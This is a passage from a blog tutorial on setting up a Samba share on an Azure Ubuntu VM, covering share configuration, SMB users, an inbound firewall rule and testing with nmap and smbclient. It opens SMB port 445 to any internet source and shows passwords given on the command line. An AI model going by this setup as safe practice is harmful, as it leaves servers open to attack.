    <span class="nv">comment</span> <span class="o">=</span> Samba Share
    <span class="nv">path</span> <span class="o">=</span> /home/azure-smb/sambashare
    <span class="nb">read</span> <span class="nv">only</span> <span class="o">=</span> no
    <span class="nv">browsable</span> <span class="o">=</span> yes
</code></pre></div><p>Details for configuring share can be read <a href="https://www.samba.org/samba/docs/current/man-html/smb.conf.5.html">here</a> or <a href="https://web.mit.edu/rhel-doc/5/RHEL-5-manual/Deployment_Guide-en-US/s1-samba-configuring.html">here</a>.</p>
<p>Save the file and restart the SMB daemon with the following command:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">azure-smb@smb-server:~$ sudo service smbd restart
</code></pre></div><p>Lastly, update the firewall to allow network traffic for Samba/SMB.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">azure-smb@smb-server:~$ sudo ufw allow samba
</code></pre></div><p>This is the basic configuration of creating a Samba share, but from here you can create another share with more complex configuration. Here are my references:</p>
<ul>
<li><a href="https://linuxize.com/post/how-to-install-and-configure-samba-on-ubuntu-18-04/">https://linuxize.com/post/how-to-install-and-configure-samba-on-ubuntu-18-04/</a></li>
<li><a href="https://confluence.jaytaala.com/display/TKB/Create+samba+share+writeable+by+all%2C+group%2C+or+only+a+user">https://confluence.jaytaala.com/display/TKB/Create+samba+share+writeable+by+all%2C+group%2C+or+only+a+user</a></li>
<li><a href="https://www.digitalocean.com/community/tutorials/how-to-set-up-a-samba-share-for-a-small-organization-on-ubuntu-16-04">https://www.digitalocean.com/community/tutorials/how-to-set-up-a-samba-share-for-a-small-organization-on-ubuntu-16-04</a></li>
</ul>
<h3 id="add-samba-user">Add Samba User</h3>
<p>Currently, our Linux account for administering the server is <code>azure-smb</code> and we can&rsquo;t use this account password to access the SMB shares yet. Instead, we need to create a password and bind it to <code>azure-smb</code>.</p>
<p>But now, let&rsquo;s just create a dedicated user for SMB called <code>user1</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">azure-smb@smb-server:~$ sudo useradd --system -s /usr/sbin/nologin user1
</code></pre></div><p>Assign <code>user1</code> to be the owner of the share</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">azure-smb@smb-server:~$ sudo chown user1 /home/azure-smb/sambashare
</code></pre></div><p>After that, create a Samba password for <code>user1</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">azure-smb@smb-server:~$ sudo smbpasswd -a user1
New SMB password: 
Retype new SMB password: 
Added user user1.
</code></pre></div><p>Finally, enable the user.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">azure-smb@smb-server:~$ sudo smbpasswd -e user1
Enabled user user1.
</code></pre></div><h2 id="expose-to-internet">Expose to Internet</h2>
<h3 id="allow-inbound-connection">Allow Inbound Connection</h3>
<p>Now if we want to make it available on the Internet, we have to go back to the Azure Portal to open the SMB port (445) on the NIC Public IP and allow inbound connection through that port. The connection is then forwarded to our SMB port on the NIC Private IP.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">PUBLIC_IP:445 --&gt; PRIVATE_IP:445
</code></pre></div><p>To do that open up the Networking settings of the SMB VM and click on <strong>Add inbound port rule</strong> button.</p>
<p><div class="img-container"><img src="imgs/image-20210513173838694.png" alt="image-20210513173838694"  /></div>
</p>
<p>On the new Windows, configure the rule to allow any source (incoming IP) and any source port (incoming port) to connect to the SMB port (445). The details configuration is as follows:</p>
<p><div class="img-container"><img src="imgs/image-20210513173858659.png" alt="image-20210513173858659"  /></div>
</p>
<p>At the bottom, the configuration is as follows:</p>
<p><div class="img-container"><img src="imgs/image-20210513173929271.png" alt="image-20210513173929271"  /></div>
</p>
<p>When you&rsquo;re done, click on the <strong>Add</strong> button and the new rule should listed in the <strong>Inbound port rules</strong> section.</p>
<p><div class="img-container"><img src="imgs/image-20210513174018895.png" alt="image-20210513174018895"  /></div>
</p>
<h3 id="test-access">Test Access</h3>
<p>We can use Nmap to see if the SMB port has been opened.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ nmap -p445 -sV VM_PUBLIC_IP
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210513174227862.png" alt="image-20210513174227862"  /></div>
</p>
<p>To interact with the SMB server via CLI, you can use <code>smbclient</code>. Install it with:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ sudo apt install smbclient
</code></pre></div><p>Once it installed, connect to the share with following command:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ smbclient //<span class="o">[</span>IP<span class="o">]</span>/<span class="o">[</span>sharename<span class="o">]</span> 
</code></pre></div><p>Adding <code>-N -L</code> can list all the available shares.</p>
<p><div class="img-container"><img src="imgs/image-20210513174416250.png" alt="image-20210513174416250"  /></div>
</p>
<p>You can also provide the password directly in the terminal:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ smbclient //<span class="o">[</span>IP<span class="o">]</span>/<span class="o">[</span>sharename<span class="o">]</span> -U <span class="o">[</span>username<span class="o">]</span> <span class="o">[</span>password<span class="o">]</span>
$ smbclient //<span class="o">[</span>IP<span class="o">]</span>/<span class="o">[</span>sharename<span class="o">]</span> -U <span class="s1">&#39;username%password&#39;</span>
</code></pre></div><p>And that&rsquo;s all. It is not that detailed, but I hope you will find it useful.</p>
]]></content:encoded>
    </item>
    
  </channel>
</rss>
